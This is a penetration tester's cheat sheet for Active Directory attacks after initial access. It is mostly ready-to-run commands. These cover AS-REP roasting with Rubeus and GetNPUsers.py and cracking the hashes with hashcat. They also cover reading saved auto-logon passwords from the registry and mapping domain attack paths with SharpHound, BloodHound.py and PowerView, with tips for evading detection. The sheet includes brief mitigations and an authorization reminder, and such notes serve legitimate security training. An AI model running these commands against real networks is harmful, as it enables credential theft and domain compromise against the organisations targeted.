# AD Authenticated Enumeration — Cheat Sheet

> Phase: **Post-Compromise / Authenticated Enumeration**
> Goal: use a foothold (creds or a shell) to roast AS-REP hashes, enumerate the local host and domain via LOTL tools, and map the domain graph with BloodHound / PowerView.

## Variables used

| Placeholder | Meaning |
|---|---|
| `<DOMAIN>` | Fully qualified domain, e.g. `corp.local` |
| `<DC_IP>` | Domain Controller IP |
| `<USERLIST>` | Path to username wordlist |
| `<HASHFILE>` | Output file for captured hashes |
| `<WORDLIST>` | Cracking wordlist (e.g. rockyou.txt) |
| `<USER>` / `<PASS>` | Known credential pair |
| `<GROUP>` | AD group name |
| `<KEYWORD>` | Registry search term |

---

## 1. AS-REP Roasting

**Requirement:** target account has `UF_DONT_REQUIRE_PREAUTH` set ("Do not require Kerberos preauthentication"). Unlike Kerberoasting, the account does **not** need to be a service account.

**Mechanism:** KDC skips verifying the pre-auth timestamp and returns an encrypted AS-REP blob → crack offline to recover the plaintext password.

### Phase 1 — Enumerate vulnerable accounts

**Rubeus (Windows only):**
```powershell
Rubeus.exe asreproast
```

**Impacket GetNPUsers.py (Linux/Windows):**
```bash
GetNPUsers.py <DOMAIN>/ -dc-ip <DC_IP> -usersfile <USERLIST> -format hashcat -outputfile <HASHFILE> -no-pass
```

> Build `<USERLIST>` quickly on a Linux box: `cat > users.txt` → paste → `Ctrl+D`, then verify with `cat users.txt`.

### Phase 2 — Crack offline

```bash
hashcat -m 18200 <HASHFILE> <WORDLIST>
```
`-m 18200` = AS-REP (Kerberos 5, etype 23, AS-REP) cracking mode.

### Mitigations (for report writing)
- Enforce Kerberos pre-auth for all accounts
- Strong/complex passwords slow offline cracking
- Monitor anomalous AS-REP requests at the KDC

---

## 2. Manual Windows Enumeration (Living Off The Land)

### 2.1 Who am I / what can I do

```cmd
whoami /all
```
Shows: user SID, group memberships, privileges.

**High-value privileges to check for:**

| Privilege | Why it matters |
|---|---|
| `SeImpersonatePrivilege` | Token impersonation → SYSTEM via "potato" attacks |
| `SeAssignPrimaryTokenPrivilege` | Assign another user's primary token to a new process (used with above) |
| `SeBackupPrivilege` | Read **any** file regardless of ACLs → dump SAM/SYSTEM hives |
| `SeRestorePrivilege` | Write **any** file/registry key → overwrite system files |
| `SeDebugPrivilege` | Attach debugger to any process → dump LSASS, inject code |

### 2.2 System & domain identification

```cmd
hostname
systeminfo
set
```

```cmd
systeminfo | findstr /B "OS"
systeminfo | findstr /B "Domain"
```

PowerShell equivalent of `set`:
```powershell
Get-ChildItem Env:
# or
dir env:
```

> `USERDOMAIN` = computer name unless domain-joined.

### 2.3 Domain users & groups — `net` commands (CMD, works from PS too)

```cmd
net user /domain                       :: list all domain users
net group /domain                      :: list all domain groups
net group "<GROUP>" /domain            :: members of a domain group
net group "Domain Computers" /domain   :: all machine accounts (end in $)
net group "Domain Admins" /domain      :: list Domain Admins

net localgroup                         :: local groups on this host
net localgroup administrators          :: members of local Administrators
```

**Groups worth checking:** Domain Admins, Administrators, Enterprise Admins, Server Operators, Backup Operators, any group with "Admin" in the name.

### 2.4 Logged-on users / sessions (who else is here)

```cmd
query user
:: or
quser
```

```cmd
tasklist            :: running processes (tasklist /V for verbose)
net session          :: SMB sessions to this host (admin required)
```

> An admin session visible here = high-value target for LSASS dumping (Mimikatz) or token impersonation.

### 2.5 Identifying service accounts

**WMIC:**
```cmd
wmic service get Name,StartName
```

**PowerShell equivalent:**
```powershell
Get-WmiObject Win32_Service | select Name, StartName
```

**SC:**
```cmd
sc query state= all
```

> Standard `StartName` values: `LocalSystem`, `NT AUTHORITY\LocalService`, `NT AUTHORITY\NetworkService`, `NT SERVICE\<Name>`. A `DOMAIN\username` service account is worth investigating (reused creds / weak password).

### 2.6 Environment variables & Registry

```cmd
set
```
Look for hints like `JAVA_HOME` → installed software/dev tools.

**Saved auto-logon creds:**
```cmd
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUsername
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AutoAdminLogon
```
(`AutoAdminLogon = 1` → auto-logon enabled)

Also check `HKLM\Security\Cache` (admin required, hashed — needs cracking).

**Installed applications:**
```cmd
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall
```

**Search registry for keyword:**
```cmd
reg query HKLM /f "<KEYWORD>" /t REG_SZ /s
```

### 2.7 Scheduled tasks

```cmd
schtasks /query
schtasks /create ...   :: create new task
schtasks /run ...      :: run existing task
```

---

## 3. BloodHound / SharpHound — Graph-Based AD Enumeration

**Concept:** "Defenders think in lists. Attackers think in graphs." — maps users, groups, ACLs, sessions, and trusts into an attack-path graph.

**Two-stage model:**
1. **Enumeration** — run a collector (SharpHound / BloodHound.py) to dump AD structure
2. **Targeted attack** — analyze offline in BloodHound GUI, find shortest path to Domain Admin

### 3.1 Collectors

| Collector | Platform | Notes |
|---|---|---|
| `SharpHound.exe` | Windows, domain-joined | Recommended / most robust |
| `BloodHound.py` | Linux/Python | No Windows tooling needed; supports creds, NTLM hash, or Kerberos ticket auth |
| `AzureHound.ps1` | PowerShell | Azure Entra ID / hybrid environments |
| `SharpHound.ps1` | PowerShell | **Deprecated** |

> ⚠️ BloodHound and SharpHound **versions must match** for successful ingestion.

### 3.2 Running SharpHound (Windows)

```cmd
.\SharpHound.exe --CollectionMethods All --Domain <DOMAIN> --ExcludeDCs
```
- `--CollectionMethods All` → run every collection module
- `--Domain <DOMAIN>` → target domain
- `--ExcludeDCs` → skip DCs (reduce detection risk)

### 3.3 Running BloodHound.py (Linux)

```bash
bloodhound-python -u <USER> -p <PASS> -d <DOMAIN> -ns <DC_IP> -c All --zip
```
- `-u` / `-p` → credentials
- `-d` → target domain
- `-ns` → DNS server IP to resolve against
- `-c All` → all collection methods
- `--zip` → package output for direct import into BloodHound

### 3.4 OpSec considerations

- Use `--ExcludeDCs` to avoid querying DCs directly
- Prefer `DCOnly` or other limited collection methods where stealth matters
- Run from a non-domain-joined box via `runas /netonly` to auth without joining the domain
- Always confirm written authorization before collecting

### 3.5 Reading a node in BloodHound

| Panel | Shows |
|---|---|
| Object information | Name, type, domain |
| Sessions | Active logons tied to the object |
| Member Of | Group memberships |
| Local Admin Rights | Machines where it has local admin |
| Execution Privileges | RDP / equivalent rights |
| Outbound Object Control | Rights it holds over other objects |
| Inbound Object Control | Rights others hold over it |

---

## 4. ActiveDirectory PowerShell Module

```powershell
Get-Module -ListAvailable ActiveDirectory   # check availability
Import-Module ActiveDirectory
```

### 4.1 Users

```powershell
Get-ADUser -Filter *
Get-ADUser -Identity <username>
Get-ADUser -Identity <username> -Properties *
Get-ADUser -Identity Administrator -Properties LastLogonDate,MemberOf,Title,Description,PwdLastSet
Get-ADUser -Filter "Name -like '*admin*'"
```

### 4.2 Groups

```powershell
Get-ADGroup -Filter *
Get-ADGroup -Filter * | Select Name
Get-ADGroupMember -Identity "<GROUP>"
Get-ADGroupMember -Identity "Domain Admins"
```

### 4.3 Computers

```powershell
Get-ADComputer -Filter *
Get-ADComputer -Filter * | Select Name, OperatingSystem
```

### 4.4 Password policy

```powershell
Get-ADDefaultDomainPasswordPolicy
```

---

## 5. PowerView (PowerSploit)

```powershell
Import-Module .\PowerView.ps1
```
(No error on import = success.)

### 5.1 Users

```powershell
Get-DomainUser                 # all domain users
Get-DomainUser *admin*          # filter by name pattern
```

### 5.2 Groups

```powershell
Get-DomainGroup                 # or Get-NetGroup
Get-DomainGroup "*admin*"
```

### 5.3 Computers

```powershell
Get-DomainComputer              # or Get-NetComputer
```

> PowerView's `Get-Domain*` cmdlets give richer filtering/formatting than native `net user`/`net group`.

---

## 6. Quick Workflow Summary

```
1. AS-REP Roast candidates   → GetNPUsers.py -usersfile <USERLIST> -no-pass
2. Crack offline              → hashcat -m 18200 <HASHFILE> <WORDLIST>
3. On a landed shell:
   whoami /all                → privileges & group membership
   hostname / systeminfo / set→ host + domain context
   net user /domain, net group /domain, net group "<GROUP>" /domain
   quser / tasklist / net session → who else is here
   wmic service get Name,StartName / sc query state= all → service accounts
   reg query ... Winlogon / Uninstall / search → saved creds & recon
   schtasks /query            → scheduled tasks
4. Deploy BloodHound collector (SharpHound.exe or bloodhound-python) → ingest into BloodHound GUI → find shortest path to DA
5. Or go native: Import-Module ActiveDirectory / PowerView.ps1 → Get-ADUser / Get-DomainUser, etc.
```
